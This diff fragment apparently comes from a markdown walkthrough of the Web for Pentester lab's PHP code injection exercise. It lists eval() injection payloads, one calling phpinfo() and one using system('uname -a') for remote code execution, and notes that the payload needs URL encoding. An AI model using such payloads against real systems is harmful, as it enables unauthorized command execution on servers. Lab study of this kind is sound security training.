@@ -4,7 +4,6 @@ Code Injection is the general term for attack types which consist of injecting c
 ### Web for Penterster walkthrough
 ### example 1
 ` eval() - evaluates a string as PHP code ` 
-
 **payload**- " .phpinfo(). "  <br>
 **payload**- " . hacker".system('uname -a');#       - change to RCE  & url encode need 
 
